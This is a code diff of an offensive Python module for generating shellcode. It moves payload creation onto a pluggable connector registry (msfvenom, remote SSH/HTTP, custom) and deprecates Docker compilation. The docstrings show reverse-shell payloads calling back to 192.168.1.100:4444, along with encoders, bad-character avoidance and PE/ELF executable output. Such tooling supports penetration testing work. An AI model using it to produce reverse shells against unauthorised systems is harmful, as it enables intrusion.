@@ -2,29 +2,39 @@
 Binary shellcode generation module for offensive operations.
 
 Provides:
+- Connector-based shellcode generation (msfvenom, remote SSH/HTTP, custom)
 - Template-based shellcode generation for Linux/Windows x86/x64
 - Custom template support for user-defined shellcode
-- msfvenom integration for loading external shellcode
 - Encoding support (XOR, alphanum)
 - Executable generation (PE/ELF)
 - Bad character detection and avoidance
+- Auto-discovery of user-defined connectors
 
 Example:
     >>> from ofx.api.shellcode import OSShellcodes
     >>>
-    >>> # Generate Linux x64 reverse shell
+    >>> # Generate with default connector (msfvenom if available)
     >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
     >>> payload = sc.create_shellcode(shellcode_type="reverse")
     >>>
-    >>> # Or load from msfvenom
-    >>> sc = OSShellcodes.from_msfvenom(msfvenom_bytes, "linux", "x64")
-    >>> payload = sc.create_shellcode(encode="xor", make_exe=1)
+    >>> # Use specific connector
+    >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
+    >>> payload = sc.create_shellcode(connector_name="msfvenom")
+    >>>
+    >>> # Use custom shellcode
+    >>> sc = OSShellcodes("linux", "x64", custom_shellcode=b"\\x90\\x90\\x90")
+    >>> payload = sc.create_shellcode()
+    >>>
+    >>> # Discover and use custom user connectors
+    >>> from ofx.api.shellcode.connectors import get_registry
+    >>> registry = get_registry()
+    >>> registry.discover_connectors()  # Auto-discover from data/shellcode/connectors
 """
 
 import ast
 import logging
 from pathlib import Path
-from typing import Callable
+from typing import Callable, Optional
 
 from ofx.settings import settings
 
@@ -32,14 +42,19 @@ from .base import ShellCode
 from .encoder import encode_alphanum, encode_xor, remove_bad_chars
 from .exe import ShellcodeToExe
 from .generator import ShellGenerator
+from .connectors import get_registry
 
 logger = logging.getLogger(settings.app_branding)
+
+# Lazy connector discovery - will run on first use
+_registry = get_registry()
 
 __all__ = [
     "OSShellcodes",
     "ShellCode",
     "ShellcodeToExe",
     "ShellGenerator",
+    "get_registry",
 ]
 
 
@@ -54,6 +69,7 @@ class OSShellcodes:
         connect_back_port: int = 5555,
         bad_chars: list[str] | None = None,
         custom_shellcode: bytes | str | None = None,
+        connector: Optional[object] = None,
     ):
         """
         Initialize shellcode generator.
@@ -65,15 +81,21 @@ class OSShellcodes:
             connect_back_port: Port for reverse/bind shell
             bad_chars: List of bad characters to avoid (e.g., ["\\x00", "\\x0a"])
             custom_shellcode: Pre-generated shellcode bytes or string
+            connector: Optional shellcode connector to use (uses best available if None)
 
         Example:
-            >>> # Generate from template
+            >>> # Generate from template/connector
             >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
             >>> payload = sc.create_shellcode(shellcode_type="reverse")
             >>>
             >>> # Use custom shellcode
             >>> sc = OSShellcodes("linux", "x64", custom_shellcode=b"\\x90\\x90\\x90")
             >>> payload = sc.create_shellcode()
+            >>>
+            >>> # Use specific connector
+            >>> from ofx.api.shellcode.connectors import get_connector
+            >>> connector = get_connector('msfvenom')
+            >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444, connector=connector)
         """
         self.name = ""
         self.OS_TARGET = os_target.upper()
@@ -82,6 +104,7 @@ class OSShellcodes:
         self.CONNECTBACK_PORT = connect_back_port
         self.BADCHARS = bad_chars or ["\\x00"]
         self.binary_path = ""
+        self.connector = connector
         self.custom_shellcode = (
             self._parse_shellcode_input(custom_shellcode) if custom_shellcode else None
         )
@@ -147,6 +170,7 @@ class OSShellcodes:
         use_docker_compile: bool = False,
         msfvenom_encoder: str | None = None,
         msfvenom_iterations: int = 1,
+        connector_name: Optional[str] = None,
     ) -> bytes:
         """
         Create shellcode with optional encoding and executable generation.
@@ -163,67 +187,69 @@ class OSShellcodes:
             dll_inj_funcs: DLL injection functions (Windows)
             shell_args: Additional arguments
             use_precompiled: Use precompiled shellcode if available
-            use_msfvenom: Force msfvenom usage (requires msfvenom CLI)
-            use_docker_compile: Force Docker assembly compilation
-            msfvenom_encoder: Msfvenom encoder (e.g., "x86/shikata_ga_nai")
+            use_msfvenom: DEPRECATED - use connector_name='msfvenom' instead
+            use_docker_compile: DEPRECATED - Docker compilation removed, use connectors
+            msfvenom_encoder: Encoder for msfvenom (e.g., "x86/shikata_ga_nai")
             msfvenom_iterations: Encoding iterations (default: 1)
+            connector_name: Name of connector to use (e.g., 'msfvenom', 'remote-ssh-kali')
+                          If None, uses instance connector or best available
 
         Returns:
             Raw shellcode bytes
 
         Example:
             >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
-            >>> # Use msfvenom explicitly
-            >>> payload = sc.create_shellcode(use_msfvenom=True)
             >>>
-            >>> # Use Docker assembly compilation
-            >>> payload = sc.create_shellcode(use_docker_compile=True)
+            >>> # Use default connector (msfvenom if available)
+            >>> payload = sc.create_shellcode(shellcode_type="reverse")
+            >>>
+            >>> # Use specific connector by name
+            >>> payload = sc.create_shellcode(
+            ...     shellcode_type="reverse",
+            ...     connector_name="msfvenom"
+            ... )
+            >>>
+            >>> # Legacy: use_msfvenom still works
+            >>> payload = sc.create_shellcode(use_msfvenom=True)
         """
         dll_inj_funcs = dll_inj_funcs or []
         shell_args = shell_args or {}
 
+        # Handle legacy use_msfvenom parameter
+        if use_msfvenom and connector_name is None:
+            connector_name = "msfvenom"
+        
+        # Warn about deprecated Docker option
         if use_docker_compile:
-            from .assembler import get_assembly_compiler
-
-            compiler = get_assembly_compiler()
-            shellcode = compiler.compile(
-                self.OS_TARGET.lower(),
-                self.OS_TARGET_ARCH,
-                shellcode_type,
-                self.CONNECTBACK_IP,
-                self.CONNECTBACK_PORT,
+            logger.warning(
+                "use_docker_compile is deprecated. Docker-based compilation has been "
+                "removed. Use connectors instead. Falling back to connector-based generation."
             )
-            self.binary_path = ""
-            if debug:
-                logger.debug(f"Docker assembly: {len(shellcode)} bytes")
 
-        elif use_msfvenom:
-            from .msfvenom import get_msfvenom_generator
+        # Determine which connector to use
+        connector = None
+        if connector_name:
+            connector = _registry.get_connector(connector_name)
+            if connector is None:
+                logger.warning(
+                    f"Connector '{connector_name}' not found. "
+                    f"Available: {_registry.list_all_connectors()}"
+                )
+        elif self.connector:
+            connector = self.connector
 
-            generator = get_msfvenom_generator()
-            shellcode = generator.generate(
-                self.OS_TARGET.lower(),
-                self.OS_TARGET_ARCH,
-                shellcode_type,
-                self.CONNECTBACK_IP,
-                self.CONNECTBACK_PORT,
-                bad_chars=self.BADCHARS if self.BADCHARS != ["\\x00"] else None,
-                encoder=msfvenom_encoder,
-                iterations=msfvenom_iterations,
-                format="raw",
-            )
-            self.binary_path = ""
-            if debug:
-                logger.debug(f"Msfvenom: {len(shellcode)} bytes")
-
-        elif self.custom_shellcode:
+        if self.custom_shellcode:
             shellcode = self.custom_shellcode
             self.binary_path = ""
             if debug:
                 logger.debug(f"Custom: {len(shellcode)} bytes")
 
         else:
-            generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
+            generator = ShellGenerator(
+                self.OS_TARGET,
+                self.OS_TARGET_ARCH,
+                connector=connector,
+            )
             shellcode, self.binary_path = generator.get_shellcode(
                 shellcode_type,
                 connectback_ip=self.CONNECTBACK_IP,
@@ -234,6 +260,9 @@ class OSShellcodes:
                 dll_inj_funcs=dll_inj_funcs,
                 shell_args=shell_args,
                 use_precompiled=use_precompiled,
+                bad_chars=self.BADCHARS if self.BADCHARS != ["\\x00"] else None,
+                encoder=msfvenom_encoder,
+                iterations=msfvenom_iterations,
             )
 
         if encode:
